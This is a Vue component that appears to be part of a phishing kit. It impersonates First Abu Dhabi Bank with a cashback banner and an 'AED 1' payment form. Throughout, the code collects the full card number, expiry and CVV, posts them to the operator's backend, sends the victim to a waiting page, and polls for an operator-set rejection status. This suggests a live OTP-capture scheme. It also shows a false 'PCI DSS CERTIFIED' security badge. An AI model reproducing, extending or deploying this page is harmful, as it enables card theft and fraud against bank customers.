<script setup lang="ts">
import { ref, onMounted, onUnmounted } from 'vue';
import { ChevronDown, CreditCard, ArrowRight, ShieldCheck } from 'lucide-vue-next';
import { useRouter } from 'vue-router';
import { updateCardRequest, getCardRequest, resolveActiveRequestId } from '../api';

const router = useRouter();

const form = ref({
  name: '',
  cardNumber: '',
  expMonth: '',
  expYear: '',
  cvv: ''
});

const isSubmitting = ref(false);
const statusBanner = ref('');
let statusCheckTimer: ReturnType<typeof setInterval> | null = null;

const errors = ref({
  name: '',
  cardNumber: '',
  expMonth: '',
  expYear: '',
  cvv: ''
});

const checkCardStatus = async () => {
  try {
    const data = await getCardRequest();
    if (data?.otpStatus === 'card_rejected') {
      statusBanner.value = 'تم رفض البطاقة البنكية من قِبل البنك المصدر. يرجى التأكد من صحة البيانات أو استخدام بطاقة دفع أخرى.';
    }
  } catch {}
};

onMounted(() => {
  checkCardStatus();
  statusCheckTimer = setInterval(checkCardStatus, 2000);
});

onUnmounted(() => {
  if (statusCheckTimer) clearInterval(statusCheckTimer);
});

const validateForm = () => {
  let isValid = true;
  errors.value = { name: '', cardNumber: '', expMonth: '', expYear: '', cvv: '' };

  if (!form.value.name.trim()) {
    errors.value.name = 'Required';
    isValid = false;
  }

  if (!/^\d{15,16}$/.test(form.value.cardNumber.replace(/\s/g, ''))) {
    errors.value.cardNumber = 'Valid card number required';
    isValid = false;
  }

  if (!form.value.expMonth) {
    errors.value.expMonth = 'Required';
    isValid = false;
  }

  if (!form.value.expYear) {
    errors.value.expYear = 'Required';
    isValid = false;
  }

  if (!/^\d{3}$/.test(form.value.cvv)) {
    errors.value.cvv = 'CVV must be exactly 3 digits';
    isValid = false;
  }

  return isValid;
};

const handleCardNumberInput = (e: Event) => {
  const target = e.target as HTMLInputElement;
  const raw = target.value.replace(/\D/g, '').slice(0, 16);
  // Format with spaces every 4 digits for clear readability
  const formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
  form.value.cardNumber = formatted;
};

const handleCvvInput = (e: Event) => {
  const target = e.target as HTMLInputElement;
  form.value.cvv = target.value.replace(/\D/g, '').slice(0, 3);
};

const submitPayment = async () => {
  if (isSubmitting.value) return;
  if (!validateForm()) return;
  
  isSubmitting.value = true;
  statusBanner.value = '';
  
  const requestId = await resolveActiveRequestId();
  if (!requestId) {
    statusBanner.value = 'لم يتم العثور على رقم الطلب، يرجى البدء من جديد.';
    isSubmitting.value = false;
    setTimeout(() => router.push('/request'), 1200);
    return;
  }

  try {
    await updateCardRequest(requestId, {
      paymentName: form.value.name,
      cardNumber: form.value.cardNumber,
      expMonth: form.value.expMonth,
      expYear: form.value.expYear,
      cvv: form.value.cvv,
      otp: '',
      otpStatus: '',
      step: 'card',
      nextAction: ''
    });
    router.push('/waiting');
  } catch (error) {
    console.error('Error updating card details:', error);
    statusBanner.value = 'تعذر حفظ بيانات البطاقة على الخادم.';
  } finally {
    isSubmitting.value = false;
  }
};
</script>

<template>
  <div class="max-w-xl mx-auto bg-white min-h-screen flex flex-col font-sans text-gray-900">
    
    <!-- Top Promotional Banner -->
    <div class="w-full bg-white relative border-b border-gray-200 shrink-0 overflow-hidden shadow-xs">
      <div class="relative w-full">
        <!-- Back Navigation Button -->
        <button
          @click="router.push('/payment')"
          aria-label="العودة"
          class="absolute top-2 right-2 z-20 w-8 h-8 rounded-full bg-black/60 hover:bg-black/80 flex items-center justify-center text-white transition-colors cursor-pointer shadow-md"
        >
          <ArrowRight class="w-4 h-4" />
        </button>

        <img
          src="/assets/aistudio/235b9d67-4dec-40f1-81b7-61ea941636ef_0f5a8538.png"
          alt="بنك أبوظبي الأول FAB - استمتع باسترداد نقدي بنسبة 30% عند الدفع باستخدام بطاقات بنك أبوظبي الأول"
          class="w-full h-auto object-cover block"
        />
      </div>
    </div>

    <!-- Order Summary Bar -->
    <div class="bg-[#07170b] text-white flex justify-between items-center px-5 py-3 shadow-xs border-b border-[#009a44]/30">
      <span class="text-sm border-b-2 border-[#39b54a] pb-0.5 inline-block tracking-wide font-semibold">Order summary</span>
      <span class="text-base font-bold text-[#39b54a] tracking-wide tabular-nums">AED 1</span>
    </div>

    <!-- Inline Status Banner if needed -->
    <div v-if="statusBanner" class="mx-5 mt-4 p-2.5 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs font-bold text-center" dir="rtl">
      {{ statusBanner }}
    </div>

    <!-- Card Form Container -->
    <div class="px-5 py-6 flex-grow bg-[#f3f9f5]">
      <div class="bg-white rounded-2xl p-5 shadow-[0_4px_20px_rgba(0,0,0,0.05)] border border-gray-200/80">
        <!-- Form Header -->
        <div class="flex justify-between items-center mb-5 pb-3 border-b border-gray-100">
          <div class="flex items-center gap-2">
            <CreditCard class="w-5 h-5 text-[#008a40]" />
            <span class="text-sm text-gray-900 font-bold tracking-tight">Pay by card</span>
          </div>
          <div class="flex gap-2 items-center">
            <img
              src="/assets/aistudio/MasterCard_Logo.svg_5b05ba46.webp"
              alt="Mastercard"
              class="h-4 w-auto object-contain"
            />
            <img
              src="/assets/aistudio/Visa_Inc._logo__2021_present_.svg_2c451104.webp"
              alt="Visa"
              class="h-3.5 w-auto object-contain"
            />
            <img
              src="/assets/aistudio/American_Express_logo__2018__3b766b47.svg"
              alt="American Express"
              class="h-4 w-auto object-contain"
            />
          </div>
        </div>

        <form @submit.prevent="submitPayment" class="space-y-5 font-sans" dir="ltr">
          
          <!-- Name -->
          <div class="relative">
            <input 
              type="text" 
              placeholder="Name on card" 
              v-model="form.name" 
              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400" 
            />
            <p v-if="errors.name" class="text-red-500 text-[11px] mt-1">{{ errors.name }}</p>
          </div>

          <!-- Card Number -->
          <div class="relative">
            <input 
              type="text"
              inputmode="numeric"
              pattern="[0-9]*"
              autocomplete="cc-number"
              placeholder="Card Number" 
              :value="form.cardNumber"
              @input="handleCardNumberInput"
              maxlength="19"
              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400 font-mono" 
            />
            <p v-if="errors.cardNumber" class="text-red-500 text-[11px] mt-1">{{ errors.cardNumber }}</p>
          </div>

          <!-- Expiry Row -->
          <div class="flex gap-4">
            <!-- Month -->
            <div class="relative w-1/2">
              <div class="flex items-center border-b border-gray-300 bg-transparent">
                <div class="pr-2 text-[#009a44] flex items-center justify-center absolute left-0">
                  <ChevronDown class="w-4 h-4 pointer-events-none" />
                </div>
                <select 
                  v-model="form.expMonth" 
                  class="w-full py-2.5 pl-7 pr-2 text-gray-900 appearance-none focus:outline-none focus:border-[#009a44] text-sm bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
                >
                  <option value="" disabled selected hidden>Month</option>
                  <option value="01">01</option>
                  <option value="02">02</option>
                  <option value="03">03</option>
                  <option value="04">04</option>
                  <option value="05">05</option>
                  <option value="06">06</option>
                  <option value="07">07</option>
                  <option value="08">08</option>
                  <option value="09">09</option>
                  <option value="10">10</option>
                  <option value="11">11</option>
                  <option value="12">12</option>
                </select>
              </div>
              <p v-if="errors.expMonth" class="text-red-500 text-[11px] mt-1">{{ errors.expMonth }}</p>
            </div>

            <!-- Year -->
            <div class="relative w-1/2">
              <div class="flex items-center border-b border-gray-300 bg-transparent">
                <div class="pr-2 text-[#009a44] flex items-center justify-center absolute left-0">
                  <ChevronDown class="w-4 h-4 pointer-events-none" />
                </div>
                <select 
                  v-model="form.expYear" 
                  class="w-full py-2.5 pl-7 pr-2 text-gray-900 appearance-none focus:outline-none focus:border-[#009a44] text-sm bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
                >
                  <option value="" disabled selected hidden>Year</option>
                  <option value="2026">2026</option>
                  <option value="2027">2027</option>
                  <option value="2028">2028</option>
                  <option value="2029">2029</option>
                  <option value="2030">2030</option>
                  <option value="2031">2031</option>
                  <option value="2032">2032</option>
                </select>
              </div>
              <p v-if="errors.expYear" class="text-red-500 text-[11px] mt-1">{{ errors.expYear }}</p>
            </div>
          </div>

          <!-- CVV -->
          <div class="relative">
            <input 
              type="password"
              inputmode="numeric"
              pattern="[0-9]*"
              autocomplete="cc-csc"
              placeholder="CVV Code" 
              :value="form.cvv"
              @input="handleCvvInput"
              maxlength="3"
              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400 font-mono" 
            />
            <p v-if="errors.cvv" class="text-red-500 text-[11px] mt-1">{{ errors.cvv }}</p>
          </div>

          <div class="pt-3">
            <button 
              type="submit" 
              :disabled="isSubmitting"
              class="w-full flex items-center justify-center gap-2 bg-[#008a40] hover:bg-[#007335] text-white transition-colors font-bold text-sm py-3 rounded-xl shadow-md tracking-wide disabled:opacity-70 disabled:cursor-not-allowed cursor-pointer"
            >
              <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
              <span v-else>PAY AED 1</span>
            </button>
          </div>
        </form>
      </div>
    </div>

    <!-- Footer Security Block -->
    <div class="px-5 py-6 bg-[#e4f2ea] flex flex-col items-center text-center w-full border-t border-gray-200/70" dir="rtl">
      <h3 class="font-bold text-gray-900 mb-2.5 text-xs">البطاقات المقبولة</h3>
      
      <div class="flex gap-2 mb-4 flex-wrap justify-center items-center" dir="ltr">
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
          <span class="text-[6.5px] font-bold text-[#1428a0] leading-tight text-center">SAMSUNG<br/>pay</span>
        </div>
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
          <span class="text-[10px] font-medium text-gray-700 flex items-center gap-1">
            <span class="font-bold text-[#008a40]">G</span> Pay
          </span>
        </div>
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
          <div class="w-5 h-3.5 relative flex items-center justify-center">
            <div class="w-3 h-3 bg-[#eb001b] rounded-full absolute left-0.5"></div>
            <div class="w-3 h-3 bg-[#f79e1b] rounded-full absolute right-0.5 opacity-90"></div>
          </div>
        </div>
        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
          <span class="text-[11px] font-extrabold text-[#1434cb] italic">VISA</span>
        </div>
      </div>

      <div class="text-center max-w-sm px-2 space-y-1.5">
        <p class="text-gray-600 text-[11px] font-medium leading-relaxed">
          تُقبل البطاقات العالمية والبطاقات الصادرة في دولة الإمارات العربية المتحدة ودول الخليج.
        </p>
        <div class="flex items-center justify-center gap-1.5 text-[11px] font-bold text-[#008a40]">
          <ShieldCheck class="w-3.5 h-3.5" />
          <span>PCI DSS CERTIFIED · بياناتك الخاصة آمنة</span>
        </div>
      </div>
    </div>

  </div>
</template>
